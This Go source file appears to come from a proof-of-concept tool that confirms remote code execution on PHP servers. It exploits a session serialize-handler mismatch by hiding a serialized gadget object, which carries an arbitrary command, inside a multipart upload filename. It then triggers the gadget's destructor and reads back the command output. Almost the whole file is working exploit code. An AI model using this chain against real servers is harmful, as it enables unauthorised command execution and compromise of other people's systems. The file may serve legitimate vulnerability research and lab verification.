package verify

import (
	"context"
	"fmt"
	"strconv"
	"strings"

	"github.com/eltonlaice/php2shell-poc/internal/mp"
)

// ChainC verifies the session handler mismatch chain.
//
// The upload is written by a directory using the php_serialize handler and
// read by a directory using the php handler. The filename contains a pipe and
// a serialized object, which the php decoder may turn into an object whose
// __destruct runs during cleanup.
func ChainC(ctx context.Context, opt Options) (Result, error) {
	res := Result{Chain: "C", Summary: "not confirmed"}
	if err := checkTarget(opt); err != nil {
		return res, err
	}
	cl := opt.client()
	sid := newSID()

	if strings.ContainsAny(opt.Command, "\"\\\x00") {
		return res, fmt.Errorf("chain C: command must not contain quotes, backslashes or NUL")
	}

	// Quote escapes are required: PHP's multipart parser unescapes \" inside
	// a quoted filename, and the serialized gadget needs its quotes intact.
	gadget := fmt.Sprintf(`O:4:"Evil":1:{s:3:"cmd";s:%d:"%s";}`, len(opt.Command), opt.Command)
	filename := "x|" + strings.ReplaceAll(gadget, `"`, `\"`)

	b := mp.New()
	parts := []mp.Part{
		{Name: "PHPSESSID", Value: []byte(sid)},
		{Name: "PHP_SESSION_UPLOAD_PROGRESS", Value: []byte("p2s")},
		{Name: "f", Filename: filename, Value: []byte("Z")},
	}
	body, err := b.Bytes(parts...)
	if err != nil {
		return res, err
	}

	pollute, err := urlFor(opt.Target, opt.PollutePath)
	if err != nil {
		return res, err
	}
	upload, err := urlFor(opt.Target, opt.UploadPath)
	if err != nil {
		return res, err
	}
	trigger, err := urlFor(opt.Target, opt.TriggerPath)
	if err != nil {
		return res, err
	}

	// Warm up the worker pool with the php_serialize directory.
	if _, err := cl.Get(pollute, nil); err == nil {
		res.Evidence = append(res.Evidence, "polluted "+opt.PollutePath)
	}

	cookie := map[string]string{"Cookie": "PHPSESSID=" + sid}
	for i := 0; i < opt.attempts(); i++ {
		select {
		case <-ctx.Done():
			return res, ctx.Err()
		default:
		}
		if _, err := cl.Post(upload, body, b.ContentType(), cookie); err != nil {
			res.Notes = append(res.Notes, "upload attempt failed: "+err.Error())
		}
	}
	res.Evidence = append(res.Evidence, fmt.Sprintf("uploaded gadget %d times to %s", opt.attempts(), opt.UploadPath))

	resp, err := cl.Get(trigger, cookie)
	if err != nil {
		return res, fmt.Errorf("chain C: trigger: %w", err)
	}
	res.Evidence = append(res.Evidence, "trigger GET -> "+strconv.Itoa(resp.Status))

	out, ok := between(resp.Body, "P2S_C_MARK:", ":P2S_C_END")
	if ok {
		res.OK = true
		res.Summary = "RCE confirmed (handler mismatch -> __destruct)"
		res.Evidence = append(res.Evidence, "command output: "+strconv.Quote(out))
		return res, nil
	}

	res.Notes = append(res.Notes,
		"needs a directory pair with different session.serialize_handler values sharing session.save_path",
		"and a gadget class with an exploitable __destruct (lab uses Evil)",
		"response: "+snippet(resp.Body, 180),
	)
	return res, nil
}
